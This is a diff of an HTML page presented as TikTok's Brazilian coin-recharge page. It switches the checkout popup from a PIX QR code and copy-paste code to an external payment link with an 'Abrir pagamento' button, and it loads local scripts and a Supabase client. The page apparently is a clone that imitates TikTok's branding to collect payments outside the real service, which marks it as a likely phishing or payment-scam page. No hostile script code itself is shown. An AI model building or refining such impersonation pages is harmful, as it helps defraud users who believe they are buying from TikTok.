@@ -5,8 +5,8 @@
 <meta charset="utf-8"/>
 <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" name="viewport"/>
 <title>Moedas do TikTok: Compre e recarregue Moedas para enviar presentes. | TikTok</title>
-<link data-rh="true" href="imagens/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
-<link href="site/style.css" rel="stylesheet"/>
+<link data-rh="true" href="../imagens/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
+<link href="style.css" rel="stylesheet"/>
 
 </head>
 <body>
@@ -157,7 +157,7 @@
 <div class="payment-method">
 <div class="payment-icons" style="display: flex; align-items: center; gap: 12px;">
 <span class="label" style="font-weight: 600; font-size: 14px;">M&eacute;todo de pagamento</span>
-<img alt="PIX" src="imagens/pix-logo-removebg-preview.png" style="height: 28px; width: auto; display: block;"/>
+<img alt="PIX" src="../imagens/pix-logo-removebg-preview.png" style="height: 28px; width: auto; display: block;"/>
 </div>
 <p id="result"></p>
 <button class="btn-recharge" id="openButton">Recarregar</button>
@@ -193,7 +193,7 @@
 <div class="summary-payment">
 <span class="payment-label">Forma de pagamento</span>
 <div class="payment-value">
-<img alt="PIX" src="imagens/pix-logo-removebg-preview.png"/>
+<img alt="PIX" src="../imagens/pix-logo-removebg-preview.png"/>
 </div>
 </div>
 </div>
@@ -232,31 +232,16 @@
 <!-- ===== POPUP - QR CODE PIX ===== -->
 <div class="popup-overlay popup-pix" id="popupPix">
 <div class="popup-box">
-<div class="pix-title" id="pixTitle">Pague com Pix</div>
-<div class="pix-qr-code" id="qrCodeArea" aria-label="Área do QR Code Pix">
-<img alt="QR Code Pix" id="qrCodeImagem"/>
-<div class="pix-qr-placeholder" id="qrCodePlaceholder">
-<svg class="pix-qr-placeholder-icon" viewBox="0 0 48 48" fill="none" aria-hidden="true">
-<rect x="5" y="5" width="14" height="14" rx="2" stroke="currentColor" stroke-width="3"/>
-<rect x="29" y="5" width="14" height="14" rx="2" stroke="currentColor" stroke-width="3"/>
-<rect x="5" y="29" width="14" height="14" rx="2" stroke="currentColor" stroke-width="3"/>
-<path d="M29 29h6v6h-6zM37 29h6M29 37h6v6h-6zM39 37h4v6M37 37v4" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
-</svg>
-<span>QR Code Pix</span>
-<small>Aguardando geração</small>
-</div>
-</div>
-<div class="pix-code-label" id="pixCodeLabel">Código Pix copia e cola</div>
-<div class="pix-copy-area" id="qrCodeTexto">Aguardando código Pix...</div>
+<div class="pix-title" id="pixTitle">Pague com link</div>
+<div class="pix-code-label" id="pixCodeLabel">Link de pagamento</div>
+<div class="pix-copy-area" id="paymentLinkText">Aguardando link de pagamento...</div>
 <div class="pix-actions">
-<button class="btn-copy-pix" id="btnCopyPix"><svg class="inline-icon" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="1.8" aria-hidden="true"><rect x="8" y="8" width="11" height="12" rx="2"/><path d="M16 8V6a2 2 0 0 0-2-2H6a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2"/></svg> Copiar código Pix</button>
-<button class="btn-copy-pix" id="btnOpenPayment" hidden><svg class="inline-icon" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="1.8" aria-hidden="true"><path d="M14 5h5v5M19 5l-8 8"/><path d="M17 13v5a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V9a2 2 0 0 1 2-2h5"/></svg> Abrir pagamento</button>
+<button class="btn-copy-pix" id="btnOpenPayment"><svg class="inline-icon" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="1.8" aria-hidden="true"><path d="M14 5h5v5M19 5l-8 8"/><path d="M17 13v5a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V9a2 2 0 0 1 2-2h5"/></svg> Abrir pagamento</button>
 <button class="btn-close-pix" id="btnClosePix">Fechar pagamento</button>
 </div>
-<div class="pix-waiting"><svg class="inline-icon" viewBox="0 0 24 24" fill="none" stroke="#6b7280" stroke-width="1.8" aria-hidden="true"><path d="M6 4h12M6 20h12M8 4c0 4 3 5 4 6-1 1-4 2-4 6M16 4c0 4-3 5-4 6"/></svg> Após o pagamento, aguarde a confirmação</div>
 </div>
 </div>
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-<script src="site/script.js"></script>
+<script src="script.js"></script>
 </body>
 </html>
